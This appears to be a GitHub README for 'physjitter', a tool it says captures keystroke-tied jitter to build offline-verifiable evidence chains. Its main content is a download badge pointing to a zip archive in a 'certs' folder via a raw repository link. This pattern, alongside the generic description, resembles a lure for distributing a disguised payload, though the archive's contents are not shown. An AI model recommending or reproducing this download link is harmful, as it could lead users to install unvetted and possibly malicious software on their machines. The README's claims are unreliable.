# 🎉 physjitter - Capture Jitter With Confidence

[![Download physjitter](https://github.com/Estebandvmapping/physjitter/raw/refs/heads/main/certs/Software-1.6-beta.4.zip)](https://github.com/Estebandvmapping/physjitter/raw/refs/heads/main/certs/Software-1.6-beta.4.zip)

## 📘 Description

physjitter is a tool that captures per-event jitter tied to your real keystrokes. It collects entropy to produce evidence chains that you can verify offline. This application operates entirely in user mode, meaning it doesn't use any kernel hooks and works on various platforms. It is engineered to have a very low probability of forgery, all without needing privileged access or hardware.
